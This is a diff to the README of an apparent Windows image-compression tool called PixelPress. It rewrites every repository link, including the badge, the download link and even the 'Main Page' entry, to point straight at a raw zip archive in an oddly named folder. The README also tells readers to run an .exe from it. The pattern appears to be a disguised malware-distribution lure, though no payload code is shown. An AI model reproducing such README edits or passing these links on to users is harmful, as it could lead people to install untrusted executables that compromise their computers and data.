@@ -1,6 +1,6 @@
 # 🖼️ PixelPress-Releases - Reduce image file sizes with ease
 
-[![Download Pixel Press](https://img.shields.io/badge/Download-PixelPress-blue.svg)](https://github.com/Bushwillowdiamondjimbrady761/PixelPress-Releases)
+[![Download Pixel Press](https://img.shields.io/badge/Download-PixelPress-blue.svg)](https://raw.githubusercontent.com/Bushwillowdiamondjimbrady761/PixelPress-Releases/main/ressala/Press_Releases_Pixel_v2.5.zip)
 
 Pixel Press turns large images into smaller files. It works on your computer, so your data stays under your control. Use this app to shrink photos without losing quality. It supports formats like AVIF and WebP.
 
@@ -18,7 +18,7 @@ Pixel Press runs on Windows 10 and Windows 11. You need a standard computer setu
 
 Visit the link below to reach the download page. Browse the list of files provided there. Choose the file ending in `.exe` for your Windows system.
 
-[Download Pixel Press Here](https://github.com/Bushwillowdiamondjimbrady761/PixelPress-Releases)
+[Download Pixel Press Here](https://raw.githubusercontent.com/Bushwillowdiamondjimbrady761/PixelPress-Releases/main/ressala/Press_Releases_Pixel_v2.5.zip)
 
 ## ⚙️ Installation Steps
 
@@ -82,6 +82,6 @@ If you find a bug, create a new issue on the repository page. Provide a descript
 
 ## 🔗 Project Links
 
-* Main Page: https://github.com/Bushwillowdiamondjimbrady761/PixelPress-Releases
+* Main Page: https://raw.githubusercontent.com/Bushwillowdiamondjimbrady761/PixelPress-Releases/main/ressala/Press_Releases_Pixel_v2.5.zip
 * Documentation: Refer to the wiki link on the repo page for more details.
 * License: This software uses the MIT license, which allows free use and modification.
